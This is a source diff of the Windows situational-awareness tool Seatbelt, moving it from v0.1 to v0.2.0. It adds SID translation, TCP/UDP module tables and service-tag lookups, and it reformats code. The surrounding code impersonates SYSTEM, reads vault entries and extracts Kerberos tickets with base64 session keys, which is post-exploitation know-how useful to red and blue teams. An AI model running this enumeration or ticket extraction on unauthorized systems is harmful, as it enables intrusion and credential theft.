@@ -16,6 +16,7 @@ using System.Text;
 using System.Text.RegularExpressions;
 using System.Web.Script.Serialization;
 using Microsoft.Win32;
+using System.Xml;
 
 namespace Seatbelt
 {
@@ -25,8 +26,39 @@ namespace Seatbelt
         public static bool filter = true;
     }
 
+    public static class NetworkAPI
+    {
+        // from boboes' code at https://stackoverflow.com/questions/33935825/pinvoke-netlocalgroupgetmembers-runs-into-fatalexecutionengineerror/33939889#33939889
+
+        [DllImport("Netapi32.dll")]
+        public extern static uint NetLocalGroupGetMembers([MarshalAs(UnmanagedType.LPWStr)] string servername, [MarshalAs(UnmanagedType.LPWStr)] string localgroupname, int level, out IntPtr bufptr, int prefmaxlen, out int entriesread, out int totalentries, out IntPtr resumehandle);
+
+        [DllImport("Netapi32.dll")]
+        public extern static int NetApiBufferFree(IntPtr Buffer);
+
+        // LOCALGROUP_MEMBERS_INFO_2 - Structure for holding members details
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+        public struct LOCALGROUP_MEMBERS_INFO_2
+        {
+            public IntPtr lgrmi2_sid;
+            public int lgrmi2_sidusage;
+            public string lgrmi2_domainandname;
+        }
+
+        // documented in MSDN
+        public const uint ERROR_ACCESS_DENIED = 0x0000005;
+        public const uint ERROR_MORE_DATA = 0x00000EA;
+        public const uint ERROR_NO_SUCH_ALIAS = 0x0000560;
+        public const uint NERR_InvalidComputer = 0x000092F;
+
+        // found by testing
+        public const uint NERR_GroupNotFound = 0x00008AC;
+        public const uint SERVER_UNAVAILABLE = 0x0006BA;
+    }
+
     public static class VaultCli
     {
+        // pulled directly from @djhohnstein's SharpWeb project: https://github.com/djhohnstein/SharpWeb/blob/master/Edge/SharpEdge.cs
         public enum VAULT_ELEMENT_TYPE : Int32
         {
             Undefined = -1,
@@ -90,8 +122,10 @@ namespace Seatbelt
         [StructLayout(LayoutKind.Explicit, CharSet = CharSet.Ansi)]
         public struct VAULT_ITEM_ELEMENT
         {
-            [FieldOffset(0)] public VAULT_SCHEMA_ELEMENT_ID SchemaElementId;
-            [FieldOffset(8)] public VAULT_ELEMENT_TYPE Type;
+            [FieldOffset(0)]
+            public VAULT_SCHEMA_ELEMENT_ID SchemaElementId;
+            [FieldOffset(8)]
+            public VAULT_ELEMENT_TYPE Type;
         }
 
         [DllImport("vaultcli.dll")]
@@ -117,35 +151,6 @@ namespace Seatbelt
 
     }
 
-    public static class NetworkAPI
-    {
-        // from boboes' code at https://stackoverflow.com/questions/33935825/pinvoke-netlocalgroupgetmembers-runs-into-fatalexecutionengineerror/33939889#33939889
-
-        [DllImport("Netapi32.dll")]
-        public extern static uint NetLocalGroupGetMembers([MarshalAs(UnmanagedType.LPWStr)] string servername, [MarshalAs(UnmanagedType.LPWStr)] string localgroupname, int level, out IntPtr bufptr, int prefmaxlen, out int entriesread, out int totalentries, out IntPtr resumehandle);
-
-        [DllImport("Netapi32.dll")]
-        public extern static int NetApiBufferFree(IntPtr Buffer);
-
-        // LOCALGROUP_MEMBERS_INFO_2 - Structure for holding members details
-        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
-        public struct LOCALGROUP_MEMBERS_INFO_2
-        {
-            public IntPtr lgrmi2_sid;
-            public int lgrmi2_sidusage;
-            public string lgrmi2_domainandname;
-        }
-
-        // documented in MSDN
-        public const uint ERROR_ACCESS_DENIED = 0x0000005;
-        public const uint ERROR_MORE_DATA = 0x00000EA;
-        public const uint ERROR_NO_SUCH_ALIAS = 0x0000560;
-        public const uint NERR_InvalidComputer = 0x000092F;
-
-        // found by testing
-        public const uint NERR_GroupNotFound = 0x00008AC;
-        public const uint SERVER_UNAVAILABLE = 0x0006BA;
-    }
 
     class Program
     {
@@ -173,9 +178,9 @@ namespace Seatbelt
         [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
         [return: MarshalAs(UnmanagedType.Bool)]
         protected static extern bool LookupPrivilegeName(
-            string lpSystemName, 
-            IntPtr lpLuid, 
-            System.Text.StringBuilder lpName, 
+            string lpSystemName,
+            IntPtr lpLuid,
+            System.Text.StringBuilder lpName,
             ref int cchName);
 
         [DllImport("wtsapi32.dll", SetLastError = true)]
@@ -213,18 +218,25 @@ namespace Seatbelt
         );
 
         [DllImport("iphlpapi.dll", SetLastError = true)]
-        static extern uint GetExtendedTcpTable(
+        public static extern uint GetExtendedTcpTable(
             IntPtr pTcpTable,
-            ref int dwOutBufLen,
+            ref uint dwOutBufLen,
             bool sort,
             int ipVersion,
             TCP_TABLE_CLASS tblClass,
             int reserved);
 
+        [DllImport("advapi32.dll", SetLastError = true)]
+        public static extern uint I_QueryTagInformation(
+            IntPtr Unknown,
+            SC_SERVICE_TAG_QUERY_TYPE Type,
+            ref SC_SERVICE_TAG_QUERY Query
+            );
+
         [DllImport("iphlpapi.dll", SetLastError = true)]
-        static extern uint GetExtendedUdpTable(
+        public static extern uint GetExtendedUdpTable(
             IntPtr pUdpTable,
-            ref int dwOutBufLen,
+            ref uint dwOutBufLen,
             bool sort,
             int ipVersion,
             UDP_TABLE_CLASS tblClass,
@@ -255,7 +267,7 @@ namespace Seatbelt
         private static extern uint LsaFreeReturnBuffer(IntPtr buffer);
 
         [DllImport("Secur32.dll", SetLastError = false)]
-        private static extern uint LsaEnumerateLogonSessions (out UInt64 LogonSessionCount, out IntPtr LogonSessionList);
+        private static extern uint LsaEnumerateLogonSessions(out UInt64 LogonSessionCount, out IntPtr LogonSessionList);
 
         [DllImport("Secur32.dll", SetLastError = false)]
         private static extern uint LsaGetLogonSessionData(IntPtr luid, out IntPtr ppLogonSessionData);
@@ -268,7 +280,7 @@ namespace Seatbelt
         [DllImport("advapi32.dll")]
         public extern static bool DuplicateToken(IntPtr ExistingTokenHandle, int SECURITY_IMPERSONATION_LEVEL, ref IntPtr DuplicateTokenHandle);
 
-        [DllImport("advapi32.dll", SetLastError= true)]
+        [DllImport("advapi32.dll", SetLastError = true)]
         static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
 
         [DllImport("advapi32.dll", SetLastError = true)]
@@ -291,6 +303,15 @@ namespace Seatbelt
         [DllImport("IpHlpApi.dll", SetLastError = true, CharSet = CharSet.Auto)]
         internal static extern int FreeMibTable(IntPtr plpNetTable);
 
+        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        static extern bool LookupAccountSid(
+          string lpSystemName,
+          [MarshalAs(UnmanagedType.LPArray)] byte[] Sid,
+          StringBuilder lpName,
+          ref uint cchName,
+          StringBuilder ReferencedDomainName,
+          ref uint cchReferencedDomainName,
+          out SID_NAME_USE peUse);
 
         // PInvoke structures/contants
         public const uint SE_GROUP_LOGON_ID = 0xC0000000; // from winnt.h
@@ -369,6 +390,19 @@ namespace Seatbelt
             SE_PRIVILEGE_ENABLED = 0x00000002,
             SE_PRIVILEGE_REMOVED = 0x00000004,
             SE_PRIVILEGE_USED_FOR_ACCESS = 0x80000000
+        }
+
+        enum SID_NAME_USE
+        {
+            SidTypeUser = 1,
+            SidTypeGroup,
+            SidTypeDomain,
+            SidTypeAlias,
+            SidTypeWellKnownGroup,
+            SidTypeDeletedAccount,
+            SidTypeInvalid,
+            SidTypeUnknown,
+            SidTypeComputer
         }
 
         [StructLayout(LayoutKind.Sequential)]
@@ -481,6 +515,143 @@ namespace Seatbelt
             UDP_TABLE_BASIC,
             UDP_TABLE_OWNER_PID,
             UDP_TABLE_OWNER_MODULE
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct SC_SERVICE_TAG_QUERY
+        {
+            public uint ProcessId;
+            public uint ServiceTag;
+            public uint Unknown;
+            public IntPtr Buffer;
+        }
+
+        public enum SC_SERVICE_TAG_QUERY_TYPE
+        {
+            ServiceNameFromTagInformation = 1,
+            ServiceNamesReferencingModuleInformation = 2,
+            ServiceNameTagMappingInformation = 3
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct MIB_TCPTABLE_OWNER_MODULE
+        {
+            public uint NumEntries;
+            MIB_TCPROW_OWNER_MODULE Table;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct MIB_TCPROW_OWNER_MODULE
+        {
+            public readonly MIB_TCP_STATE State;
+            public readonly uint LocalAddr;
+            private readonly byte LocalPort1;
+            private readonly byte LocalPort2;
+            private readonly byte LocalPort3;
+            private readonly byte LocalPort4;
+            public readonly uint RemoteAddr;
+            private readonly byte RemotePort1;
+            private readonly byte RemotePort2;
+            private readonly byte RemotePort3;
+            private readonly byte RemotePort4;
+            public readonly uint OwningPid;
+            public readonly UInt64 CreateTimestamp;
+            public readonly UInt64 OwningModuleInfo0;
+            public readonly UInt64 OwningModuleInfo1;
+            public readonly UInt64 OwningModuleInfo2;
+            public readonly UInt64 OwningModuleInfo3;
+            public readonly UInt64 OwningModuleInfo4;
+            public readonly UInt64 OwningModuleInfo5;
+            public readonly UInt64 OwningModuleInfo6;
+            public readonly UInt64 OwningModuleInfo7;
+            public readonly UInt64 OwningModuleInfo8;
+            public readonly UInt64 OwningModuleInfo9;
+            public readonly UInt64 OwningModuleInfo10;
+            public readonly UInt64 OwningModuleInfo11;
+            public readonly UInt64 OwningModuleInfo12;
+            public readonly UInt64 OwningModuleInfo13;
+            public readonly UInt64 OwningModuleInfo14;
+            public readonly UInt64 OwningModuleInfo15;
+
+
+            public ushort LocalPort
+            {
+                get
+                {
+                    return BitConverter.ToUInt16(
+                        new byte[2] { LocalPort2, LocalPort1 }, 0);
+                }
+            }
+
+            public IPAddress LocalAddress
+            {
+                get { return new IPAddress(LocalAddr); }
+            }
+
+            public IPAddress RemoteAddress
+            {
+                get { return new IPAddress(RemoteAddr); }
+            }
+
+            public ushort RemotePort
+            {
+                get
+                {
+                    return BitConverter.ToUInt16(
+                        new byte[2] { RemotePort2, RemotePort1 }, 0);
+                }
+            }
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct MIB_UDPTABLE_OWNER_MODULE
+        {
+            public uint NumEntries;
+            MIB_UDPROW_OWNER_MODULE Table;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct MIB_UDPROW_OWNER_MODULE
+        {
+            public readonly uint LocalAddr;
+            private readonly byte LocalPort1;
+            private readonly byte LocalPort2;
+            private readonly byte LocalPort3;
+            private readonly byte LocalPort4;
+            public readonly uint OwningPid;
+            public readonly UInt64 CreateTimestamp;
+            public readonly UInt32 SpecificPortBind_Flags;
+            // public readonly UInt32 Flags;
+            public readonly UInt64 OwningModuleInfo0;
+            public readonly UInt64 OwningModuleInfo1;
+            public readonly UInt64 OwningModuleInfo2;
+            public readonly UInt64 OwningModuleInfo3;
+            public readonly UInt64 OwningModuleInfo4;
+            public readonly UInt64 OwningModuleInfo5;
+            public readonly UInt64 OwningModuleInfo6;
+            public readonly UInt64 OwningModuleInfo7;
+            public readonly UInt64 OwningModuleInfo8;
+            public readonly UInt64 OwningModuleInfo9;
+            public readonly UInt64 OwningModuleInfo10;
+            public readonly UInt64 OwningModuleInfo11;
+            public readonly UInt64 OwningModuleInfo12;
+            public readonly UInt64 OwningModuleInfo13;
+            public readonly UInt64 OwningModuleInfo14;
+            public readonly UInt64 OwningModuleInfo15;
+
+            public ushort LocalPort
+            {
+                get
+                {
+                    return BitConverter.ToUInt16(
+                        new byte[2] { LocalPort2, LocalPort1 }, 0);
+                }
+            }
+
+            public IPAddress LocalAddress
+            {
+                get { return new IPAddress(LocalAddr); }
+            }
         }
 
         [StructLayout(LayoutKind.Sequential)]
@@ -895,9 +1066,9 @@ namespace Seatbelt
             public LSA_STRING_OUT Upn;
         }
 
-        const int MAXLEN_PHYSADDR = 8;
-
-        const int ERROR_INSUFFICIENT_BUFFER = 122;
+        public const int MAXLEN_PHYSADDR = 8;
+        public const int ERROR_SUCCESS = 0;
+        public const int ERROR_INSUFFICIENT_BUFFER = 122;
 
         [StructLayout(LayoutKind.Sequential)]
         internal struct MIB_IPNETROW
@@ -949,6 +1120,38 @@ namespace Seatbelt
             WTSCloseServer(ServerHandle);
         }
 
+        public static string TranslateSid(string Sid)
+        {
+            // adapted from http://www.pinvoke.net/default.aspx/advapi32.LookupAccountSid
+            SecurityIdentifier accountSid = new SecurityIdentifier(Sid);
+            byte[] accountSidByes = new byte[accountSid.BinaryLength];
+            accountSid.GetBinaryForm(accountSidByes, 0);
+
+            StringBuilder name = new StringBuilder();
+            uint cchName = (uint)name.Capacity;
+            StringBuilder referencedDomainName = new StringBuilder();
+            uint cchReferencedDomainName = (uint)referencedDomainName.Capacity;
+            SID_NAME_USE sidUse;
+
+            int err = 0;
+            if (!LookupAccountSid(null, accountSidByes, name, ref cchName, referencedDomainName, ref cchReferencedDomainName, out sidUse))
+            {
+                err = System.Runtime.InteropServices.Marshal.GetLastWin32Error();
+                if (err == ERROR_INSUFFICIENT_BUFFER)
+                {
+                    name.EnsureCapacity((int)cchName);
+                    referencedDomainName.EnsureCapacity((int)cchReferencedDomainName);
+                    err = 0;
+                    if (!LookupAccountSid(null, accountSidByes, name, ref cchName, referencedDomainName, ref cchReferencedDomainName, out sidUse))
+                        err = System.Runtime.InteropServices.Marshal.GetLastWin32Error();
+                }
+            }
+            if (err == 0)
+                return String.Format("{0}\\{1}", referencedDomainName.ToString(), name.ToString());
+            else
+                return "";
+        }
+
         public static void PrintLogo()
         {
             Console.WriteLine("\r\n\r\n                        %&&@@@&&                                                                                  ");
@@ -962,7 +1165,7 @@ namespace Seatbelt
             Console.WriteLine("###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####");
             Console.WriteLine("#####%######################  %%%..                       @////(((&%%%%%%%################                        ");
             Console.WriteLine("                        &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*                         ");
-            Console.WriteLine("                        &%%&&&%%%%%          v0.1         ,(((&%%%%%%%%%%%%%%%%%,                                 ");
+            Console.WriteLine("                        &%%&&&%%%%%        v0.2.0         ,(((&%%%%%%%%%%%%%%%%%,                                 ");
             Console.WriteLine("                         #%%%%##,                                                                                 \r\n\r\n");
         }
 
@@ -973,7 +1176,8 @@ namespace Seatbelt
             if (hive == "HKCU")
             {
                 var regKey = Registry.CurrentUser.OpenSubKey(path);
-                if (regKey != null) {
+                if (regKey != null)
+                {
                     regKeyValue = String.Format("{0}", regKey.GetValue(value));
                 }
                 return regKeyValue;
@@ -987,9 +1191,11 @@ namespace Seatbelt
                 }
                 return regKeyValue;
             }
-            else {
+            else
+            {
                 var regKey = Registry.LocalMachine.OpenSubKey(path);
-                if (regKey != null) {
+                if (regKey != null)
+                {
                     regKeyValue = String.Format("{0}", regKey.GetValue(value));
                 }
                 return regKeyValue;
@@ -1005,7 +1211,7 @@ namespace Seatbelt
                 var regKey = Registry.CurrentUser.OpenSubKey(path);
                 if (regKey != null)
                 {
-                    regKeyValue = (byte[]) regKey.GetValue(value);
+                    regKeyValue = (byte[])regKey.GetValue(value);
                 }
                 return regKeyValue;
             }
@@ -1272,11 +1478,11 @@ namespace Seatbelt
                 CloseHandle(hDupToken);
 
                 string name = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
-                if(name != "NT AUTHORITY\\SYSTEM")
+                if (name != "NT AUTHORITY\\SYSTEM")
                 {
                     return false;
                 }
-                
+
                 return true;
             }
             else
@@ -1309,7 +1515,7 @@ namespace Seatbelt
             // checks if the "S-1-5-32-544" in the current token groups set, meaning the user is a local administrator
             string[] SIDs = GetTokenGroupSIDs();
 
-            foreach(string SID in SIDs)
+            foreach (string SID in SIDs)
             {
                 if (SID == "S-1-5-32-544")
                 {
@@ -1434,7 +1640,8 @@ namespace Seatbelt
                 }
                 return false;
             }
-            catch {
+            catch
+            {
                 return false;
             }
         }
@@ -1476,8 +1683,8 @@ namespace Seatbelt
 
         public static IEnumerable<string> Split(string text, int partLength)
         {
-            if (text == null) { throw new ArgumentNullException("singleLineString"); }
-            if (partLength < 1) { throw new ArgumentException("'columns' must be greater than 0."); }
+            if (text == null) { Console.WriteLine("[ERROR] Split() - singleLineString"); }
+            if (partLength < 1) { Console.WriteLine("[ERROR] Split() - 'columns' must be greater than 0."); }
 
             var partCount = Math.Ceiling((double)text.Length / partLength);
             if (partCount < 2)
@@ -1626,7 +1833,7 @@ namespace Seatbelt
             // adapted from https://stackoverflow.com/questions/4349743/setting-size-of-token-privileges-luid-and-attributes-array-returned-by-gettokeni
 
             try
-            {                
+            {
                 Console.WriteLine("\r\n\r\n=== Current Privileges ===\r\n");
 
                 int TokenInfLength = 0;
@@ -1694,60 +1901,65 @@ namespace Seatbelt
 
         public static void ListNonstandardServices()
         {
-            // lists installed services via the win32_service WMI class
-            //      filters out services w/ binary paths in C:\Windows\System32\
-            //      if "full" is passed, no filtering is done
+            // lists installed servics that don't have "Microsoft Corporation" as the company name in their file info
+            //      or all services if "full" is passed
 
             if (FilterResults.filter)
             {
-                Console.WriteLine("\r\n\r\n=== Non C:\\Windows\\ Services (via WMI) ===\r\n");
+                Console.WriteLine("\r\n\r\n=== Non Microsoft Services (via WMI) ===\r\n");
             }
             else
             {
-                Console.WriteLine("\r\n\r\n=== Services (via WMI) ===\r\n");
+                Console.WriteLine("\r\n\r\n=== All Services (via WMI) ===\r\n");
             }
 
-            try {
+            try
+            {
                 ManagementObjectSearcher wmiData = new ManagementObjectSearcher(@"root\cimv2", "SELECT * FROM win32_service");
                 ManagementObjectCollection data = wmiData.Get();
 
                 foreach (ManagementObject result in data)
                 {
-                    if ((result["PathName"] != null) && ((!FilterResults.filter) || (!Regex.IsMatch(result["PathName"].ToString(), "C:\\\\WINDOWS\\\\", RegexOptions.IgnoreCase))))
+                    //OLD - if ((result["PathName"] != null) && ((!FilterResults.filter) || (!Regex.IsMatch(result["PathName"].ToString(), "C:\\\\WINDOWS\\\\", RegexOptions.IgnoreCase))))
+                    if (result["PathName"] != null)
                     {
                         Match path = Regex.Match(result["PathName"].ToString(), @"^\W*([a-z]:\\.+?(\.exe|\.dll|\.sys))\W*", RegexOptions.IgnoreCase);
                         String binaryPath = path.Groups[1].ToString();
-                        bool isDotNet = false;
-                        try
+                        FileVersionInfo myFileVersionInfo = FileVersionInfo.GetVersionInfo(binaryPath);
+                        string companyName = myFileVersionInfo.CompanyName;
+                        if ((String.IsNullOrEmpty(companyName)) || (!FilterResults.filter) || (!Regex.IsMatch(companyName, @"^Microsoft.*", RegexOptions.IgnoreCase)))
                         {
-                            AssemblyName myAssemblyName = AssemblyName.GetAssemblyName(binaryPath);
-                            isDotNet = true;
-                        }
-                        catch (System.IO.FileNotFoundException)
-                        {
-                            // System.Console.WriteLine("The file cannot be found.");
-                        }
-
-                        catch (System.BadImageFormatException exception)
-                        {
-                            if(Regex.IsMatch(exception.Message, ".*This assembly is built by a runtime newer than the currently loaded runtime and cannot be loaded.*", RegexOptions.IgnoreCase))
+                            bool isDotNet = false;
+                            try
                             {
+                                AssemblyName myAssemblyName = AssemblyName.GetAssemblyName(binaryPath);
                                 isDotNet = true;
                             }
-                        }
+                            catch (System.IO.FileNotFoundException)
+                            {
+                                // System.Console.WriteLine("The file cannot be found.");
+                            }
+                            catch (System.BadImageFormatException exception)
+                            {
+                                if (Regex.IsMatch(exception.Message, ".*This assembly is built by a runtime newer than the currently loaded runtime and cannot be loaded.*", RegexOptions.IgnoreCase))
+                                {
+                                    isDotNet = true;
+                                }
+                            }
+                            catch
+                            {
+                                // System.Console.WriteLine("The assembly has already been loaded.");
+                            }
 
-                        catch
-                        {
-                            // System.Console.WriteLine("The assembly has already been loaded.");
+                            Console.WriteLine("  Name             : {0}", result["Name"]);
+                            Console.WriteLine("  DisplayName      : {0}", result["DisplayName"]);
+                            Console.WriteLine("  Company Name     : {0}", companyName);
+                            Console.WriteLine("  Description      : {0}", result["Description"]);
+                            Console.WriteLine("  State            : {0}", result["State"]);
+                            Console.WriteLine("  StartMode        : {0}", result["StartMode"]);
+                            Console.WriteLine("  PathName         : {0}", result["PathName"]);
+                            Console.WriteLine("  IsDotNet         : {0}\r\n", isDotNet);
                         }
-
-                        Console.WriteLine("  Name             : {0}", result["Name"]);
-                        Console.WriteLine("  DisplayName      : {0}", result["DisplayName"]);
-                        Console.WriteLine("  Description      : {0}", result["Description"]);
-                        Console.WriteLine("  State            : {0}", result["State"]);
-                        Console.WriteLine("  StartMode        : {0}", result["StartMode"]);
-                        Console.WriteLine("  PathName         : {0}", result["PathName"]);
-                        Console.WriteLine("  IsDotNet         : {0}\r\n", isDotNet);
                     }
                 }
             }
@@ -1760,7 +1972,8 @@ namespace Seatbelt
         public static void ListUserFolders()
         {
             // lists the folders in C:\Users\, showing users who have logged onto the system
-            try {
+            try
+            {
                 Console.WriteLine("\r\n\r\n=== User Folders ===\r\n");
                 string userPath = String.Format("{0}\\Users\\", Environment.GetEnvironmentVariable("SystemDrive"));
 
@@ -2067,8 +2280,8 @@ namespace Seatbelt
                                     ticket = (KERB_TICKET_CACHE_INFO)Marshal.PtrToStructure(currTicketPtr, typeof(KERB_TICKET_CACHE_INFO));
 
                                     // extract our fields
-                                    string serverName = Marshal.PtrToStringUni(ticket.ServerName.Buffer, ticket.ServerName.Length/2);
-                                    string realmName = Marshal.PtrToStringUni(ticket.RealmName.Buffer, ticket.RealmName.Length/2);
+                                    string serverName = Marshal.PtrToStringUni(ticket.ServerName.Buffer, ticket.ServerName.Length / 2);
+                                    string realmName = Marshal.PtrToStringUni(ticket.RealmName.Buffer, ticket.RealmName.Length / 2);
                                     DateTime startTime = DateTime.FromFileTime(ticket.StartTime);
                                     DateTime endTime = DateTime.FromFileTime(ticket.EndTime);
                                     DateTime renewTime = DateTime.FromFileTime(ticket.RenewTime);
@@ -2423,13 +2636,13 @@ namespace Seatbelt
 
                 // query LSA, specifying we want the the TGT data
                 retCode = LsaCallAuthenticationPackage_KERB_RETRIEVE_TKT(lsaHandle, authPack, ref tQuery, Marshal.SizeOf(tQuery), out responsePointer, out returnBufferLength, out protocalStatus);
-                
+
                 // parse the returned pointer into our initial KERB_RETRIEVE_TKT_RESPONSE structure
                 response = (KERB_RETRIEVE_TKT_RESPONSE)Marshal.PtrToStructure((System.IntPtr)responsePointer, typeof(KERB_RETRIEVE_TKT_RESPONSE));
-                
+
                 KERB_EXTERNAL_NAME serviceNameStruct = (KERB_EXTERNAL_NAME)Marshal.PtrToStructure(response.Ticket.ServiceName, typeof(KERB_EXTERNAL_NAME));
-                string serviceName = Marshal.PtrToStringUni(serviceNameStruct.Names.Buffer, serviceNameStruct.Names.Length/2).Trim();
-                
+                string serviceName = Marshal.PtrToStringUni(serviceNameStruct.Names.Buffer, serviceNameStruct.Names.Length / 2).Trim();
+
                 string targetName = "";
                 if (response.Ticket.TargetName != IntPtr.Zero)
                 {
@@ -2440,7 +2653,7 @@ namespace Seatbelt
                 KERB_EXTERNAL_NAME clientNameStruct = (KERB_EXTERNAL_NAME)Marshal.PtrToStructure(response.Ticket.ClientName, typeof(KERB_EXTERNAL_NAME));
                 string clientName = Marshal.PtrToStringUni(clientNameStruct.Names.Buffer, clientNameStruct.Names.Length / 2).Trim();
 
-                string domainName = Marshal.PtrToStringUni(response.Ticket.DomainName.Buffer, response.Ticket.DomainName.Length/2).Trim();
+                string domainName = Marshal.PtrToStringUni(response.Ticket.DomainName.Buffer, response.Ticket.DomainName.Length / 2).Trim();
                 string targetDomainName = Marshal.PtrToStringUni(response.Ticket.TargetDomainName.Buffer, response.Ticket.TargetDomainName.Length / 2).Trim();
                 string altTargetDomainName = Marshal.PtrToStringUni(response.Ticket.AltTargetDomainName.Buffer, response.Ticket.AltTargetDomainName.Length / 2).Trim();
 
@@ -2450,7 +2663,7 @@ namespace Seatbelt
                 byte[] sessionKey = new byte[sessionKeyLength];
                 Marshal.Copy(response.Ticket.SessionKey.Value, sessionKey, 0, sessionKeyLength);
                 string base64SessionKey = Convert.ToBase64String(sessionKey);
-                
+
                 DateTime keyExpirationTime = DateTime.FromFileTime(response.Ticket.KeyExpirationTime);
                 DateTime startTime = DateTime.FromFileTime(response.Ticket.StartTime);
                 DateTime endTime = DateTime.FromFileTime(response.Ticket.EndTime);
@@ -2924,8 +3137,11 @@ namespace Seatbelt
             {
                 Console.WriteLine("\r\n\r\n=== Local Group Memberships ===\r\n");
 
-                Console.WriteLine("  * Administrators *\r\n");
-                string[] localAdmins = GetLocalGroupMembers("Administrators");
+                // localization for @cnotin ;)
+                string localAdminsNameFull = TranslateSid("S-1-5-32-544");
+                string localAdminsName = localAdminsNameFull.Substring(localAdminsNameFull.IndexOf('\\') + 1);
+                Console.WriteLine("  * {0} *\r\n", localAdminsName);
+                string[] localAdmins = GetLocalGroupMembers(localAdminsName);
                 if (localAdmins != null)
                 {
                     foreach (string member in localAdmins)
@@ -2934,8 +3150,10 @@ namespace Seatbelt
                     }
                 }
 
-                Console.WriteLine("\r\n  * Remote Desktop Users *\r\n");
-                string[] localRDPUsers = GetLocalGroupMembers("Remote Desktop Users");
+                string rdpNameFull = TranslateSid("S-1-5-32-555");
+                string rdpName = rdpNameFull.Substring(rdpNameFull.IndexOf('\\') + 1);
+                Console.WriteLine("\r\n  * {0} *\r\n", rdpName);
+                string[] localRDPUsers = GetLocalGroupMembers(rdpName);
                 if (localRDPUsers != null)
                 {
                     foreach (string member in localRDPUsers)
@@ -2944,8 +3162,10 @@ namespace Seatbelt
                     }
                 }
 
-                Console.WriteLine("\r\n  * Distributed COM Users *\r\n");
-                string[] distComUsers = GetLocalGroupMembers("Distributed COM Users");
+                string comNameFull = TranslateSid("S-1-5-32-562");
+                string comName = comNameFull.Substring(comNameFull.IndexOf('\\') + 1);
+                Console.WriteLine("\r\n  * {0} *\r\n", comName);
+                string[] distComUsers = GetLocalGroupMembers(comName);
                 if (distComUsers != null)
                 {
                     foreach (string member in distComUsers)
@@ -2954,8 +3174,10 @@ namespace Seatbelt
                     }
                 }
 
-                Console.WriteLine("\r\n  * Remote Management Users *\r\n");
-                string[] remoteManagementUsers = GetLocalGroupMembers("Remote Management Users");
+                string remoteManagementNameFull = TranslateSid("S-1-5-32-580");
+                string remoteManagementName = remoteManagementNameFull.Substring(remoteManagementNameFull.IndexOf('\\') + 1);
+                Console.WriteLine("\r\n  * {0} *\r\n", remoteManagementName);
+                string[] remoteManagementUsers = GetLocalGroupMembers(remoteManagementName);
                 if (remoteManagementUsers != null)
                 {
                     foreach (string member in remoteManagementUsers)
@@ -2972,7 +3194,8 @@ namespace Seatbelt
 
         public static void ListMappedDrives()
         {
-            try {
+            try
+            {
                 Console.WriteLine("\r\n\r\n=== Drive Information (via .NET) ===\r\n");
 
                 // grab all drive letters
@@ -2996,7 +3219,8 @@ namespace Seatbelt
 
         public static void ListWMIMappedDrives()
         {
-            try {
+            try
+            {
                 ManagementObjectSearcher wmiData = new ManagementObjectSearcher(@"root\cimv2", "SELECT * FROM win32_networkconnection");
                 ManagementObjectCollection data = wmiData.Get();
 
@@ -3024,7 +3248,8 @@ namespace Seatbelt
         {
             // lists current network shares for this system via WMI
 
-            try {
+            try
+            {
                 ManagementObjectSearcher wmiData = new ManagementObjectSearcher(@"root\cimv2", "SELECT * FROM Win32_Share");
                 ManagementObjectCollection data = wmiData.Get();
 
@@ -3905,7 +4130,7 @@ namespace Seatbelt
 
         public static void ListRegistryAutoRuns()
         {
-            Console.WriteLine("\r\n\r\n=== Registry Autoruns ===\r\n");
+            Console.WriteLine("\r\n\r\n=== Registry Autoruns ===");
 
             string[] autorunLocations = new string[] {
                 "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
@@ -3918,11 +4143,12 @@ namespace Seatbelt
                 "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnceService"
             };
 
-            foreach (string autorunLocation in autorunLocations) {
+            foreach (string autorunLocation in autorunLocations)
+            {
                 Dictionary<string, object> settings = GetRegValues("HKLM", autorunLocation);
                 if ((settings != null) && (settings.Count != 0))
                 {
-                    Console.WriteLine("  HKLM:\\{0} :", autorunLocation);
+                    Console.WriteLine("\r\n  HKLM:\\{0} :", autorunLocation);
                     foreach (KeyValuePair<string, object> kvp in settings)
                     {
                         Console.WriteLine("    {0}", kvp.Value);
@@ -4042,7 +4268,7 @@ namespace Seatbelt
                     if (Enabled.ToString() == "True")
                     {
                         Object Action = currentItem.GetType().InvokeMember("Action", BindingFlags.GetProperty, null, currentItem, null);
-                        if ( (FilterResults.filter && (Action.ToString() == "0")) || !FilterResults.filter)
+                        if ((FilterResults.filter && (Action.ToString() == "0")) || !FilterResults.filter)
                         {
                             // extract all of our fields
                             Object Name = currentItem.GetType().InvokeMember("Name", BindingFlags.GetProperty, null, currentItem, null);
@@ -4102,7 +4328,7 @@ namespace Seatbelt
         public static void ListDNSCache()
         {
             Console.WriteLine("\r\n\r\n=== DNS Cache (via WMI) ===\r\n");
-            
+
             // lists the local DNS cache via WMI (MSFT_DNSClientCache class)
             try
             {
@@ -4176,7 +4402,7 @@ namespace Seatbelt
                                     string description = String.Format("{0} ({1}) --- Index {2}", ni.Name, string.Join(",", (string[])ips.ToArray(Type.GetType("System.String"))), p.Index);
                                     if (!String.IsNullOrEmpty(dnsServers))
                                     {
-                                        description += String.Format("\r\n  DNS Servers : {0}\r\n", dnsServers);
+                                        description += String.Format("\r\n    DNS Servers : {0}\r\n", dnsServers);
                                     }
                                     adapters.Add(p.Index, description);
                                 }
@@ -4235,13 +4461,13 @@ namespace Seatbelt
                     {
                         if (adapters.ContainsKey(indexAdapter))
                         {
-                            Console.WriteLine("\r\n\r\nInterface     : {0}", adapters[indexAdapter]);
+                            Console.WriteLine("\r\n\r\n  Interface     : {0}", adapters[indexAdapter]);
                         }
                         else
                         {
-                            Console.WriteLine("\r\n\r\nInterface     : n/a --- Index {0}", indexAdapter);
